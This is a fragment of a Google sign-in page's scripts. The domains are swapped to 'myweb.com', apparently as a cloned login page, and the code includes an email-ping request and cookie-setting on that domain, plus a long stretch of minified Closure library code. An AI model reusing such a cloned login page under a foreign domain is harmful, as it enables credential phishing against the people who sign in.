CLjK+S9HDt+x3Qk0VuIU6VlXxxGWzkCrIy7ID/jtXv6BdRQcHvEqk6/wiBWex/v2MUJ9UOAtE1UxqOfW2NAm8N8IQR5hlqLn22iFIeXH3xjDgSOy4dHjRQAiuLWruJD7PUiUJBAabzyy+ybgFon2gwbBQtMzJVGzC2BqvyJoewPyrgFdcSmHVydffqLapf5SHkuterss554t25l0kE+09B4UoLvMb0yplDM7VFjSWuMOqrY2Ar+yO5qw7t252q4hsWo7CLqGW1i13zYYPDBepTl5sJyci7xDbmSnnio0M/qd1V/zoO2h071wEmABkNq2');
		</script>
		<script>
			gaia = window.gaia || {};
			gaia.ps = gaia.ps || {};
			gaia.ps.hasPrefilledIdentifier = false;
			function gaia_parseFragment() {
				var hash = location.hash;
				var params = {};
				if (!hash) {
					return params;
				}
				var paramStrs = decodeURIComponent(hash.substring(1)).split('&');
				for (var i = 0; i < paramStrs.length; i++) {
					var param = paramStrs[i].split('=');
					params[param[0]] = param[1];
				}
				return params;
			}

			function gaia_prefillEmail() {
				var email = null;
				var form = null;
				if (document.getElementById) {
					email = document.getElementById('Email');
					form = document.getElementById('gaia_loginform');
				}
				if (form && email && (email.value == null || email.value == '') && (email.type != 'hidden')) {
					hashParams = gaia_parseFragment();
					if (hashParams['Email'] && hashParams['Email'] != '') {
						email.value = hashParams['Email'];

					}
				}
			}

			try {
				gaia_prefillEmail();
			} catch (e) {
			}

		</script>
		<script>
			var gaia_scrollToElement = function(element) {
				var calculateOffsetHeight = function(element) {
					var curtop = 0;
					if (element.offsetParent) {
						while (element) {
							curtop += element.offsetTop;
							element = element.offsetParent;
						}
					}
					return curtop;
				}
				var siginOffsetHeight = calculateOffsetHeight(element);
				var scrollHeight = siginOffsetHeight - window.innerHeight + element.clientHeight + 0.02 * window.innerHeight;
				window.scroll(0, scrollHeight);
			}
		</script>
		<script>
			(function() {
				var $ = function(id) {
					return document.getElementById(id);
				};
				var gaiaLoginForm = $('gaia_loginform');
				var chromeExt = 'chrome-extension://mfffpogegjflfpflabcdkioaeobkgjik';
				var chromeSigninUrl = 'chrome://chrome-signin';
				var chromeOsUrl = 'chrome://oobe';
				var chromeWebview = undefined;
				onMessage = function(e) {
					if (e.origin == chromeSigninUrl || e.origin == chromeOsUrl) {
						chromeWebview = e.source;
					}
				};
				window.addEventListener('message', onMessage);
				gaia_onChromeLoginSubmit = function(e) {
					if (!chromeWebview && window == window.parent) {
						return;
					}
					if (gaiaLoginForm['Email'] && gaiaLoginForm['Passwd']) {
						var checkboxElement = $('advanced-box');
						var chooseWhatToSync = checkboxElement && checkboxElement.checked;
						var attemptToken = new Date().getTime();
						var msg = {
							method : 'attemptLogin',
							email : gaiaLoginForm['Email'].value,
							password : gaiaLoginForm['Passwd'].value,
							attemptToken : attemptToken,
							chooseWhatToSync : chooseWhatToSync
						};
						if (chromeWebview) {
							chromeWebview.postMessage(msg, chromeSigninUrl);
						} else {
							window.parent.postMessage(msg, chromeExt);
						}
						console.log('Credentials sent');
						var continueUrlElement = gaiaLoginForm['continue'];
						if (continueUrlElement) {
							var prevAttemptIndex = continueUrlElement.value.indexOf('?attemptToken');
							if (prevAttemptIndex != -1) {
								continueUrlElement.value = continueUrlElement.value.substr(0, prevAttemptIndex);
							}
							continueUrlElement.value += '?attemptToken=' + attemptToken;
						}
					}
				};
				gaia_attachEvent(gaiaLoginForm, 'submit', gaia_onChromeLoginSubmit);
			})();
		</script>
		<script type="text/javascript">
			var BrowserSupport_ = {
				IsBrowserSupported : function() {
					var agt = navigator.userAgent.toLowerCase();
					var is_op = agt.indexOf("opera") != -1;
					var is_ie = agt.indexOf("msie") != -1 && document.all && !is_op;
					var is_ie5 = agt.indexOf("msie 5") != -1 && document.all && !is_op;
					var is_mac = agt.indexOf("mac") != -1;
					var is_gk = agt.indexOf("gecko") != -1;
					var is_sf = agt.indexOf("safari") != -1;
					if (is_ie && !is_op && !is_mac) {
						if (agt.indexOf("palmsource") != -1 || agt.indexOf("regking") != -1 || agt.indexOf("windows ce") != -1 || agt.indexOf("j2me") != -1 || agt.indexOf("avantgo") != -1 || agt.indexOf(" stb") != -1)
							return false;
						var v = BrowserSupport_.GetFollowingFloat(agt, "msie ");
						if (v != null)
							return v >= 5.5
					}
					if (is_gk && !is_sf) {
						var v = BrowserSupport_.GetFollowingFloat(agt, "rv:");
						if (v != null)
							return v >= 1.4;
						else {
							v = BrowserSupport_.GetFollowingFloat(agt, "galeon/");
							if (v != null)
								return v >= 1.3
						}
					}
					if (is_sf) {
						if (agt.indexOf("rv:3.14.15.92.65") != -1)
							return false;
						var v = BrowserSupport_.GetFollowingFloat(agt, "applewebkit/");
						if (v != null)
							return v >= 312
					}
					if (is_op) {
						if (agt.indexOf("sony/com1") != -1)
							return false;
						var v = BrowserSupport_.GetFollowingFloat(agt, "opera ");
						if (v == null)
							v = BrowserSupport_.GetFollowingFloat(agt, "opera/");
						if (v != null)
							return v >= 8
					}
					if (agt.indexOf("pda; sony/com2") != -1)
						return true;
					return false
				},
				GetFollowingFloat : function(str, pfx) {
					var i = str.indexOf(pfx);
					if (i != -1) {
						var v = parseFloat(str.substring(i + pfx.length));
						if (!isNaN(v))
							return v
					}
					return null
				}
			};
			var is_browser_supported = BrowserSupport_.IsBrowserSupported()
		</script>
		<script type="text/javascript">
			<!--

			var start_time = (new Date()).getTime();

			if (top.location != self.location) {
				top.location = self.location.href;
			}

			function SetGmailCookie(name, value) {
				document.cookie = name + "=" + value + ";path=/;domain=.myweb.com";
			}

			function lg() {
				var now = (new Date()).getTime();

				var cookie = "T" + start_time + "/" + start_time + "/" + now;
				SetGmailCookie("GMAIL_LOGIN", cookie);
			}

			function StripParam(url, param) {
				var start = url.indexOf(param);
				if (start == -1)
					return url;
				var end = start + param.length;

				var charBefore = url.charAt(start - 1);
				if (charBefore != '?' && charBefore != '&')
					return url;

				var charAfter = (url.length >= end + 1) ? url.charAt(end) : '';
				if (charAfter != '' && charAfter != '&' && charAfter != '#')
					return url;
				if (charBefore == '&') {--start;
				} else if (charAfter == '&') {++end;
				}
				return url.substring(0, start) + url.substring(end);
			}

			var fixed = 0;
			function FixForm() {
				if (is_browser_supported) {
					var form = el("gaia_loginform");
					if (form && form["continue"]) {
						var url = form["continue"].value;
						url = StripParam(url, "ui=html");
						url = StripParam(url, "zy=l");
						form["continue"].value = url;
					}
				}
				fixed = 1;
			}

			function el(id) {
				if (document.getElementById) {
					return document.getElementById(id);
				} else if (window[id]) {
					return window[id];
				}
				return null;
			}

			var ONE_PX = "###//mail.myweb.com/mail/images/cleardot.gif?t=" + (new Date()).getTime();
			function LogRoundtripTime() {
				var img = new Image();
				var start = (new Date()).getTime();
				img.onload = GetRoundtripTimeFunction(start);
				img.src = ONE_PX;
			}

			function GetRoundtripTimeFunction(start) {
				return function() {
					var end = (new Date()).getTime();
					SetGmailCookie("GMAIL_RTT", (end - start));
				}
			}

			function MaybePingUser() {
				var f = el("gaia_loginform");
				if (f.Email.value) {
					new Image().src = '###//mail.myweb.com/mail/gxlu?email=' + encodeURIComponent(f.Email.value) + '&zx=' + (new Date().getTime());
				}
			}

			var passwd_elem = el("Passwd");
			if (passwd_elem) {
				passwd_elem.onfocus = MaybePingUser;
			}
			function OnLoad() {
				MaybePingUser();
				LogRoundtripTime();
				LoadConversionScript();
			}

			var myweb_conversion_type = 'landing';
			var myweb_conversion_id = 1069902127;
			var myweb_conversion_language = "en_US";
			var myweb_conversion_format = "1";
			var myweb_conversion_color = "FFFFFF";
			function LoadConversionScript() {
				var script = document.createElement("script");
				script.type = "text/javascript";
				script.src = "";
			}

			// -->
		</script>
		<script>
			gaia_attachEvent(window, 'load', function() {
				OnLoad();
				FixForm();
			});
			(function() {
				var gaiaLoginForm = document.getElementById('gaia_loginform');
				var gaia_onsubmitHandler = gaiaLoginForm.onsubmit;
				gaiaLoginForm.onsubmit = function() {
					lg();
					if (!fixed) {
						FixForm();
					}
					gaia_onsubmitHandler();
				};
			})();
		</script>
		<script>
for(var PS_aa="function"==typeof Object.defineProperties?Object.defineProperty:function(a,b,c){if(c.get||c.set)throw new TypeError("ES3 does not support getters and setters.");a!=Array.prototype&&a!=Object.prototype&&(a[b]=c.value)},PS_a="undefined"!=typeof window&&window===this?this:"undefined"!=typeof global&&null!=global?global:this,PS_ba=["Array","prototype","fill"],PS_ca=0;PS_ca<PS_ba.length-1;PS_ca++){var PS_da=PS_ba[PS_ca];PS_da in PS_a||(PS_a[PS_da]={});PS_a=PS_a[PS_da]}
var PS_ea=PS_ba[PS_ba.length-1],PS_fa=PS_a[PS_ea],PS_ga=PS_fa?PS_fa:function(a,b,c){var d=this.length||0;0>b&&(b=Math.max(0,d+b));if(null==c||c>d)c=d;c=Number(c);0>c&&(c=Math.max(0,d+c));for(b=Number(b||0);b<c;b++)this[b]=a;return this};PS_ga!=PS_fa&&null!=PS_ga&&PS_aa(PS_a,PS_ea,{configurable:!0,writable:!0,value:PS_ga});
var PS_ha=PS_ha||{},PS_b=this,PS_c=function(a){return void 0!==a},PS_ia=function(){},PS_d=function(a){var b=typeof a;if("object"==b)if(a){if(a instanceof Array)return"array";if(a instanceof Object)return b;var c=Object.prototype.toString.call(a);if("[object Window]"==c)return"object";if("[object Array]"==c||"number"==typeof a.length&&"undefined"!=typeof a.splice&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("splice"))return"array";if("[object Function]"==c||"undefined"!=typeof a.call&&
"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("call"))return"function"}else return"null";else if("function"==b&&"undefined"==typeof a.call)return"object";return b},PS_e=function(a){return"array"==PS_d(a)},PS_ja=function(a){var b=PS_d(a);return"array"==b||"object"==b&&"number"==typeof a.length},PS_f=function(a){return"string"==typeof a},PS_ka=function(a){return"number"==typeof a},PS_la=function(a){var b=typeof a;return"object"==b&&null!=a||"function"==b},PS_ma="closure_uid_"+
(1E9*Math.random()>>>0),PS_na=0,PS_oa=function(a,b,c){return a.call.apply(a.bind,arguments)},PS_pa=function(a,b,c){if(!a)throw Error();if(2<arguments.length){var d=Array.prototype.slice.call(arguments,2);return function(){var c=Array.prototype.slice.call(arguments);Array.prototype.unshift.apply(c,d);return a.apply(b,c)}}return function(){return a.apply(b,arguments)}},PS_g=function(a,b,c){PS_g=Function.prototype.bind&&-1!=Function.prototype.bind.toString().indexOf("native code")?PS_oa:PS_pa;return PS_g.apply(null,
arguments)},PS_qa=function(a,b){var c=Array.prototype.slice.call(arguments,1);return function(){var b=c.slice();b.push.apply(b,arguments);return a.apply(this,b)}},PS_h=Date.now||function(){return+new Date},PS_i=function(a,b){function c(){}c.prototype=b.prototype;a.N=b.prototype;a.prototype=new c;a.prototype.constructor=a;a.Fa=function(a,c,f){for(var d=Array(arguments.length-2),e=2;e<arguments.length;e++)d[e-2]=arguments[e];return b.prototype[c].apply(a,d)}};var PS_ra=function(a){if(Error.captureStackTrace)Error.captureStackTrace(this,PS_ra);else{var b=Error().stack;b&&(this.stack=b)}a&&(this.message=String(a))};PS_i(PS_ra,Error);PS_ra.prototype.name="CustomError";var PS_sa=function(a,b){for(var c=a.split("%s"),d="",e=Array.prototype.slice.call(arguments,1);e.length&&1<c.length;)d+=c.shift()+e.shift();return d+c.join("%s")},PS_ta=String.prototype.trim?function(a){return a.trim()}:function(a){return a.replace(/^[\s\xa0]+|[\s\xa0]+$/g,"")},PS_ua=function(a){return decodeURIComponent(a.replace(/\+/g," "))},PS_Ca=function(a){if(!PS_va.test(a))return a;-1!=a.indexOf("&")&&(a=a.replace(PS_wa,"&amp;"));-1!=a.indexOf("<")&&(a=a.replace(PS_xa,"&lt;"));-1!=a.indexOf(">")&&
(a=a.replace(PS_ya,"&gt;"));-1!=a.indexOf('"')&&(a=a.replace(PS_za,"&quot;"));-1!=a.indexOf("'")&&(a=a.replace(PS_Aa,"&#39;"));-1!=a.indexOf("\x00")&&(a=a.replace(PS_Ba,"&#0;"));return a},PS_wa=/&/g,PS_xa=/</g,PS_ya=/>/g,PS_za=/"/g,PS_Aa=/'/g,PS_Ba=/\x00/g,PS_va=/[\x00&<>"']/,PS_Ea=function(a,b){var c=0;a=PS_ta(String(a)).split(".");b=PS_ta(String(b)).split(".");for(var d=Math.max(a.length,b.length),e=0;0==c&&e<d;e++){var f=a[e]||"",g=b[e]||"";do{f=/(\d*)(\D*)(.*)/.exec(f)||["","","",""];g=/(\d*)(\D*)(.*)/.exec(g)||
["","","",""];if(0==f[0].length&&0==g[0].length)break;c=PS_Da(0==f[1].length?0:parseInt(f[1],10),0==g[1].length?0:parseInt(g[1],10))||PS_Da(0==f[2].length,0==g[2].length)||PS_Da(f[2],g[2]);f=f[3];g=g[3]}while(0==c)}return c},PS_Da=function(a,b){return a<b?-1:a>b?1:0},PS_Fa=function(a){return String(a).replace(/\-([a-z])/g,function(a,c){return c.toUpperCase()})},PS_Ga=function(a){var b=PS_f(void 0)?"undefined".replace(/([-()\[\]{}+?*.$\^|,:#<!\\])/g,"\\$1").replace(/\x08/g,"\\x08"):"\\s";return a.replace(new RegExp("(^"+
(b?"|["+b+"]+":"")+")([a-z])","g"),function(a,b,e){return b+e.toUpperCase()})};var PS_Ha=function(a,b){b.unshift(a);PS_ra.call(this,PS_sa.apply(null,b));b.shift()};PS_i(PS_Ha,PS_ra);PS_Ha.prototype.name="AssertionError";
var PS_Ia=function(a,b,c,d){var e="Assertion failed";if(c)var e=e+(": "+c),f=d;else a&&(e+=": "+a,f=b);throw new PS_Ha(""+e,f||[]);},PS_j=function(a,b,c){a||PS_Ia("",null,b,Array.prototype.slice.call(arguments,2));return a},PS_k=function(a,b){throw new PS_Ha("Failure"+(a?": "+a:""),Array.prototype.slice.call(arguments,1));},PS_Ja=function(a,b,c){PS_ka(a)||PS_Ia("Expected number but got %s: %s.",[PS_d(a),a],b,Array.prototype.slice.call(arguments,2));return a},PS_Ka=function(a,b,c){PS_f(a)||PS_Ia("Expected string but got %s: %s.",
[PS_d(a),a],b,Array.prototype.slice.call(arguments,2))},PS_La=function(a,b,c){PS_la(a)&&1==a.nodeType||PS_Ia("Expected Element but got %s: %s.",[PS_d(a),a],b,Array.prototype.slice.call(arguments,2));return a},PS_Na=function(a,b,c,d){a instanceof b||PS_Ia("Expected instanceof %s but got %s.",[PS_Ma(b),PS_Ma(a)],c,Array.prototype.slice.call(arguments,3))},PS_Ma=function(a){return a instanceof Function?a.displayName||a.name||"unknown type name":a instanceof Object?a.constructor.displayName||a.constructor.name||
Object.prototype.toString.call(a):null===a?"null":typeof a};var PS_Oa=Array.prototype.indexOf?function(a,b,c){PS_j(null!=a.length);return Array.prototype.indexOf.call(a,b,c)}:function(a,b,c){c=null==c?0:0>c?Math.max(0,a.length+c):c;if(PS_f(a))return PS_f(b)&&1==b.length?a.indexOf(b,c):-1;for(;c<a.length;c++)if(c in a&&a[c]===b)return c;return-1},PS_Pa=Array.prototype.forEach?function(a,b,c){PS_j(null!=a.length);Array.prototype.forEach.call(a,b,c)}:function(a,b,c){for(var d=a.length,e=PS_f(a)?a.split(""):a,f=0;f<d;f++)f in e&&b.call(c,e[f],f,a)},PS_Qa=Array.prototype.filter?
function(a,b,c){PS_j(null!=a.length);return Array.prototype.filter.call(a,b,c)}:function(a,b,c){for(var d=a.length,e=[],f=0,g=PS_f(a)?a.split(""):a,h=0;h<d;h++)if(h in g){var k=g[h];b.call(c,k,h,a)&&(e[f++]=k)}return e},PS_Sa=function(a){var b;a:{b=PS_Ra;for(var c=a.length,d=PS_f(a)?a.split(""):a,e=0;e<c;e++)if(e in d&&b.call(void 0,d[e],e,a)){b=e;break a}b=-1}return 0>b?null:PS_f(a)?a.charAt(b):a[b]},PS_Ta=function(a,b){b=PS_Oa(a,b);var c;if(c=0<=b)PS_j(null!=a.length),Array.prototype.splice.call(a,
b,1);return c},PS_Ua=function(a){return Array.prototype.concat.apply(Array.prototype,arguments)},PS_Va=function(a){var b=a.length;if(0<b){for(var c=Array(b),d=0;d<b;d++)c[d]=a[d];return c}return[]};var PS_l=function(){this.S=this.S;this.A=this.A};PS_l.prototype.S=!1;PS_l.prototype.Y=function(){this.S||(this.S=!0,this.c())};var PS_m=function(a,b){b=PS_qa(PS_Wa,b);a.S?PS_c(void 0)?b.call(void 0):b():(a.A||(a.A=[]),a.A.push(PS_c(void 0)?PS_g(b,void 0):b))};PS_l.prototype.c=function(){if(this.A)for(;this.A.length;)this.A.shift()()};var PS_Wa=function(a){a&&"function"==typeof a.Y&&a.Y()};var PS_Xa=function(a){PS_Xa[" "](a);return a};PS_Xa[" "]=PS_ia;var PS_Za=function(a,b){var c=PS_Ya;return Object.prototype.hasOwnProperty.call(c,a)?c[a]:c[a]=b(a)};var PS__a=function(a,b,c){for(var d in a)b.call(c,a[d],d,a)},PS_0a=function(a){var b=[],c=0,d;for(d in a)b[c++]=a[d];return b},PS_1a=function(a){var b=[],c=0,d;for(d in a)b[c++]=d;return b},PS_2a="constructor hasOwnProperty isPrototypeOf propertyIsEnumerable toLocaleString toString valueOf".split(" "),PS_3a=function(a,b){for(var c,d,e=1;e<arguments.length;e++){d=arguments[e];for(c in d)a[c]=d[c];for(var f=0;f<PS_2a.length;f++)c=PS_2a[f],Object.prototype.hasOwnProperty.call(d,c)&&(a[c]=d[c])}},PS_4a=
function(a){var b=arguments.length;if(1==b&&PS_e(arguments[0]))return PS_4a.apply(null,arguments[0]);for(var c={},d=0;d<b;d++)c[arguments[d]]=!0;return c};var PS_n;a:{var PS_5a=PS_b.navigator;if(PS_5a){var PS_6a=PS_5a.userAgent;if(PS_6a){PS_n=PS_6a;break a}}PS_n=""}var PS_=function(a){return-1!=PS_n.indexOf(a)};var PS_8a=function(){return PS_("Safari")&&!(PS_7a()||PS_("Coast")||PS_("Opera")||PS_("Edge")||PS_("Silk")||PS_("Android"))},PS_7a=function(){return(PS_("Chrome")||PS_("CriOS"))&&!PS_("Edge")};var PS_9a=function(){return PS_("iPhone")&&!PS_("iPod")&&!PS_("iPad")};var PS_o=PS_("Opera"),PS_p=PS_("Trident")||PS_("MSIE"),PS_$a=PS_("Edge"),PS_q=PS_("Gecko")&&!(-1!=PS_n.toLowerCase().indexOf("webkit")&&!PS_("Edge"))&&!(PS_("Trident")||PS_("MSIE"))&&!PS_("Edge"),PS_r=-1!=PS_n.toLowerCase().indexOf("webkit")&&!PS_("Edge"),PS_ab=PS_("Macintosh"),PS_bb=function(){var a=PS_b.document;return a?a.documentMode:void 0},PS_cb;
a:{var PS_db="",PS_eb=function(){var a=PS_n;if(PS_q)return/rv\:([^\);]+)(\)|;)/.exec(a);if(PS_$a)return/Edge\/([\d\.]+)/.exec(a);if(PS_p)return/\b(?:MSIE|rv)[: ]([^\);]+)(\)|;)/.exec(a);if(PS_r)return/WebKit\/(\S+)/.exec(a);if(PS_o)return/(?:Version)[ \/]?(\S+)/.exec(a)}();PS_eb&&(PS_db=PS_eb?PS_eb[1]:"");if(PS_p){var PS_fb=PS_bb();if(null!=PS_fb&&PS_fb>parseFloat(PS_db)){PS_cb=String(PS_fb);break a}}PS_cb=PS_db}
var PS_gb=PS_cb,PS_Ya={},PS_s=function(a){return PS_Za(a,function(){return 0<=PS_Ea(PS_gb,a)})},PS_t;var PS_hb=PS_b.document;PS_t=PS_hb&&PS_p?PS_bb()||("CSS1Compat"==PS_hb.compatMode?parseInt(PS_gb,10):5):void 0;var PS_ib=!PS_p||9<=Number(PS_t),PS_jb=!PS_p||9<=Number(PS_t),PS_kb=PS_p&&!PS_s("9");!PS_r||PS_s("528");PS_q&&PS_s("1.9b")||PS_p&&PS_s("8")||PS_o&&PS_s("9.5")||PS_r&&PS_s("528");PS_q&&!PS_s("8")||PS_p&&PS_s("9");var PS_u=function(a,b){this.type=a;this.a=this.target=b;this.pa=!0};PS_u.prototype.preventDefault=function(){this.pa=!1};var PS_lb=function(a,b){PS_u.call(this,a?a.type:"");this.a=this.target=null;this.key="";this.keyCode=0;this.oa=!1;this.P=null;if(a){this.type=a.type;this.target=a.target||a.srcElement;this.a=b;if((b=a.relatedTarget)&&PS_q)try{PS_Xa(b.nodeName)}catch(c){}this.keyCode=a.keyCode||0;this.key=a.key||"";this.oa=a.ctrlKey;this.P=a;a.defaultPrevented&&this.preventDefault()}};PS_i(PS_lb,PS_u);var PS_mb=[1,4,2];
PS_lb.prototype.preventDefault=function(){PS_lb.N.preventDefault.call(this);var a=this.P;if(a.preventDefault)a.preventDefault();else if(a.returnValue=!1,PS_kb)try{if(a.ctrlKey||112<=a.keyCode&&123>=a.keyCode)a.keyCode=-1}catch(b){}};var PS_nb="closure_listenable_"+(1E6*Math.random()|0),PS_ob=function(a){return!(!a||!a[PS_nb])},PS_pb=0;var PS_qb=function(a,b,c,d,e){this.listener=a;this.a=null;this.src=b;this.type=c;this.capture=!!d;this.$=e;this.key=++PS_pb;this.T=this.X=!1},PS_rb=function(a){a.T=!0;a.listener=null;a.a=null;a.src=null;a.$=null};var PS_sb=function(a){this.src=a;this.a={};this.c=0},PS_ub=function(a,b,c,d,e,f){var g=b.toString();b=a.a[g];b||(b=a.a[g]=[],a.c++);var h=PS_tb(b,c,e,f);-1<h?(a=b[h],d||(a.X=!1)):(a=new PS_qb(c,a.src,g,!!e,f),a.X=d,b.push(a));return a},PS_vb=function(a,b){var c=b.type;c in a.a&&PS_Ta(a.a[c],b)&&(PS_rb(b),0==a.a[c].length&&(delete a.a[c],a.c--))},PS_wb=function(a,b,c,d,e){a=a.a[b.toString()];b=-1;a&&(b=PS_tb(a,c,d,e));return-1<b?a[b]:null},PS_tb=function(a,b,c,d){for(var e=0;e<a.length;++e){var f=
a[e];if(!f.T&&f.listener==b&&f.capture==!!c&&f.$==d)return e}return-1};var PS_xb="closure_lm_"+(1E6*Math.random()|0),PS_yb={},PS_zb=0,PS_Ab=function(a,b,c,d,e){if(PS_e(b)){for(var f=0;f<b.length;f++)PS_Ab(a,b[f],c,d,e);return null}c=PS_Bb(c);return PS_ob(a)?PS_Cb(a,b,c,d,e):PS_Db(a,b,c,!1,d,e)},PS_Db=function(a,b,c,d,e,f){if(!b)throw Error("Invalid event type");var g=!!e,h=PS_Eb(a);h||(a[PS_xb]=h=new PS_sb(a));c=PS_ub(h,b,c,d,e,f);if(c.a)return c;d=PS_Fb();c.a=d;d.src=a;d.listener=c;if(a.addEventListener)a.addEventListener(b.toString(),d,g);else if(a.attachEvent)a.attachEvent(PS_Gb(b.toString()),
d);else throw Error("addEventListener and attachEvent are unavailable.");PS_zb++;return c},PS_Fb=function(){var a=PS_Hb,b=PS_jb?function(c){return a.call(b.src,b.listener,c)}:function(c){c=a.call(b.src,b.listener,c);if(!c)return c};return b},PS_Ib=function(a,b,c,d,e){if(PS_e(b)){for(var f=0;f<b.length;f++)PS_Ib(a,b[f],c,d,e);return null}c=PS_Bb(c);return PS_ob(a)?PS_ub(a.b,String(b),c,!0,d,e):PS_Db(a,b,c,!0,d,e)},PS_Jb=function(a,b,c,d,e){if(PS_e(b))for(var f=0;f<b.length;f++)PS_Jb(a,b[f],c,d,e);
else c=PS_Bb(c),PS_ob(a)?(a=a.b,b=String(b).toString(),b in a.a&&(f=a.a[b],c=PS_tb(f,c,d,e),-1<c&&(PS_rb(f[c]),PS_j(null!=f.length),Array.prototype.splice.call(f,c,1),0==f.length&&(delete a.a[b],a.c--)))):a&&(a=PS_Eb(a))&&(c=PS_wb(a,b,c,!!d,e))&&PS_v(c)},PS_v=function(a){if(!PS_ka(a)&&a&&!a.T){var b=a.src;if(PS_ob(b))PS_vb(b.b,a);else{var c=a.type,d=a.a;b.removeEventListener?b.removeEventListener(c,d,a.capture):b.detachEvent&&b.detachEvent(PS_Gb(c),d);PS_zb--;(c=PS_Eb(b))?(PS_vb(c,a),0==c.c&&(c.src=
null,b[PS_xb]=null)):PS_rb(a)}}},PS_Gb=function(a){return a in PS_yb?PS_yb[a]:PS_yb[a]="on"+a},PS_Lb=function(a,b,c,d){var e=!0;if(a=PS_Eb(a))if(b=a.a[b.toString()])for(b=b.concat(),a=0;a<b.length;a++){var f=b[a];f&&f.capture==c&&!f.T&&(f=PS_Kb(f,d),e=e&&!1!==f)}return e},PS_Kb=function(a,b){var c=a.listener,d=a.$||a.src;a.X&&PS_v(a);return c.call(d,b)},PS_Hb=function(a,b){if(a.T)return!0;if(!PS_jb){if(!b)a:{b=["window","event"];for(var c=PS_b,d;d=b.shift();)if(null!=c[d])c=c[d];else{b=null;break a}b=
c}d=b;b=new PS_lb(d,this);c=!0;if(!(0>d.keyCode||void 0!=d.returnValue)){a:{var e=!1;if(0==d.keyCode)try{d.keyCode=-1;break a}catch(g){e=!0}if(e||void 0==d.returnValue)d.returnValue=!0}d=[];for(e=b.a;e;e=e.parentNode)d.push(e);a=a.type;for(e=d.length-1;0<=e;e--){b.a=d[e];var f=PS_Lb(d[e],a,!0,b),c=c&&f}for(e=0;e<d.length;e++)b.a=d[e],f=PS_Lb(d[e],a,!1,b),c=c&&f}return c}return PS_Kb(a,new PS_lb(b,this))},PS_Eb=function(a){a=a[PS_xb];return a instanceof PS_sb?a:null},PS_Mb="__closure_events_fn_"+(1E9*
Math.random()>>>0),PS_Bb=function(a){PS_j(a,"Listener can not be null.");if("function"==PS_d(a))return a;PS_j(a.handleEvent,"An object listener must have handleEvent method.");a[PS_Mb]||(a[PS_Mb]=function(b){return a.handleEvent(b)});return a[PS_Mb]};var PS_Nb=function(a){var b;b=b||0;return function(){return a.apply(this,Array.prototype.slice.call(arguments,0,b))}},PS_Ob=function(a){var b=!1,c;return function(){b||(c=a(),b=!0);return c}};var PS_w=function(a,b,c){PS_l.call(this);this.a=null;this.h=!1;this.f=a;this.i=c;this.b=b||window;this.g=PS_g(this.j,this)};PS_i(PS_w,PS_l);PS_w.prototype.start=function(){PS_Pb(this);this.h=!1;var a=PS_Qb(this),b=PS_Rb(this);a&&!b&&this.b.mozRequestAnimationFrame?(this.a=PS_Ab(this.b,"MozBeforePaint",this.g),this.b.mozRequestAnimationFrame(null),this.h=!0):this.a=a&&b?a.call(this.b,this.g):this.b.setTimeout(PS_Nb(this.g),20)};
var PS_Pb=function(a){if(null!=a.a){var b=PS_Qb(a),c=PS_Rb(a);b&&!c&&a.b.mozRequestAnimationFrame?PS_v(a.a):b&&c?c.call(a.b,a.a):a.b.clearTimeout(a.a)}a.a=null};PS_w.prototype.j=function(){this.h&&this.a&&PS_v(this.a);this.a=null;this.f.call(this.i,PS_h())};PS_w.prototype.c=function(){PS_Pb(this);PS_w.N.c.call(this)};
var PS_Qb=function(a){a=a.b;return a.requestAnimationFrame||a.webkitRequestAnimationFrame||a.mozRequestAnimationFrame||a.oRequestAnimationFrame||a.msRequestAnimationFrame||null},PS_Rb=function(a){a=a.b;return a.cancelAnimationFrame||a.cancelRequestAnimationFrame||a.webkitCancelRequestAnimationFrame||a.mozCancelRequestAnimationFrame||a.oCancelRequestAnimationFrame||a.msCancelRequestAnimationFrame||null};var PS_x=function(){PS_l.call(this);this.b=new PS_sb(this);this.U=this;this.D=null};PS_i(PS_x,PS_l);PS_x.prototype[PS_nb]=!0;PS_x.prototype.removeEventListener=function(a,b,c,d){PS_Jb(this,a,b,c,d)};
var PS_y=function(a,b){PS_Sb(a);var c,d=a.D;if(d){c=[];for(var e=1;d;d=d.D)c.push(d),PS_j(1E3>++e,"infinite loop")}a=a.U;d=b.type||b;PS_f(b)?b=new PS_u(b,a):b instanceof PS_u?b.target=b.target||a:(e=b,b=new PS_u(d,a),PS_3a(b,e));var e=!0,f;if(c)for(var g=c.length-1;0<=g;g--)f=b.a=c[g],e=PS_Tb(f,d,!0,b)&&e;f=b.a=a;e=PS_Tb(f,d,!0,b)&&e;e=PS_Tb(f,d,!1,b)&&e;if(c)for(g=0;g<c.length;g++)f=b.a=c[g],e=PS_Tb(f,d,!1,b)&&e};
PS_x.prototype.c=function(){PS_x.N.c.call(this);if(this.b){var a=this.b,b=0,c;for(c in a.a){for(var d=a.a[c],e=0;e<d.length;e++)++b,PS_rb(d[e]);delete a.a[c];a.c--}}this.D=null};
var PS_Cb=function(a,b,c,d,e){PS_Sb(a);return PS_ub(a.b,String(b),c,!1,d,e)},PS_Tb=function(a,b,c,d){b=a.b.a[String(b)];if(!b)return!0;b=b.concat();for(var e=!0,f=0;f<b.length;++f){var g=b[f];if(g&&!g.T&&g.capture==c){var h=g.listener,k=g.$||g.src;g.X&&PS_vb(a.b,g);e=!1!==h.call(k,d)&&e}}return e&&0!=d.pa},PS_Sb=function(a){PS_j(a.b,"Event target is not initialized. Did you call the superclass (goog.events.EventTarget) constructor?")};var PS_z=function(a,b){PS_x.call(this);this.g=a||1;this.f=b||PS_b;this.i=PS_g(this.l,this);this.j=PS_h()};PS_i(PS_z,PS_x);PS_z.prototype.h=!1;PS_z.prototype.a=null;var PS_Vb=function(a,b){a.g=b;a.a&&a.h?(PS_Ub(a),a.start()):a.a&&PS_Ub(a)};PS_z.prototype.l=function(){if(this.h){var a=PS_h()-this.j;0<a&&a<.8*this.g?this.a=this.f.setTimeout(this.i,this.g-a):(this.a&&(this.f.clearTimeout(this.a),this.a=null),PS_y(this,"tick"),this.h&&(this.a=this.f.setTimeout(this.i,this.g),this.j=PS_h()))}};
